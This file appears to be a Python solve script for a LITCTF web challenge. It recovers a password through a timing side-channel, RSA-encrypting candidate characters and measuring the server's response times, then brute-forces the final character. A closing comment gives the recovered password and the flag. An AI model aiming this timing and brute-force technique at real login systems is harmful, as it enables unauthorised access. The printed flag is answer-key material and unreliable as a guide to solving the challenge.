import requests
import time
import string

            # var result = 1;
            # for (var i = 0; i < exp; ++i) {
            #     result = (result * base) % mod;
            # }
            # return result;

def encrypt(input):
    p = 3217
    q = 6451
    e = 17
    N = p * q
    phi = (p - 1) * (q - 1)
    d = 4880753

    res = 1
    for i in range(e):
        res = (res * input) % N
    return res

URL = "http://litctf.live:31776"

big_num = 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999

# for l in range(1,50):
#     dic = [big_num] * l
#     password = ','.join([str(x) for x in dic])

#     start = time.time()
#     requests.get(URL + "/verify?password=" + password)
#     end = time.time()
#     # print(URL + "/verify?password=" + password)
#     print(f'length: {l} - time: ' + str(end - start))


# length = 6

# length = 6

# real_pass = ""
# dic = [big_num] * length

# for l in range(length):
#     for c in string.ascii_letters + string.digits:
#         dic[l] = encrypt(ord(c))
#         password = ','.join([str(x) for x in dic])
#         start = time.time()
#         requests.get(URL + "/verify?password=" + password)
#         end = time.time()
#         # print(URL + "/verify?password=" + password)
#         print(f"{c} - {str(end-start)}")
#         if end - start > 15 :
#             real_pass += c
#             print(real_pass)
#             break

import requests
import time
import string

def encrypt(input):
    p = 3217
    q = 6451
    e = 17
    N = p * q
    phi = (p - 1) * (q - 1)
    d = 4880753

    res = 1
    for i in range(e):
        res = (res * input) % N
    return res
    
length = 6
first_5_char_real_pass = "CxIj6"
dic = [big_num] * length
for _ in range(5):
    dic[_] = encrypt(ord(first_5_char_real_pass[_]))

for c in string.ascii_letters + string.digits:
    dic[5] = encrypt(ord(c))
    password = ','.join([str(x) for x in dic])
    r = requests.get(URL + "/verify?password=" + password)
    # print(URL + "/verify?password=" + password)
    if "LITCTF" in r.text:
        print("[-] password: " + first_5_char_real_pass + c)
        print(r.text)
        break

'''
Kết quả:
    password: CxIj6p
    -> Flag: LITCTF{uwu_st3ph4ni3_i5_s0_0rz_0rz_0TZ}
'''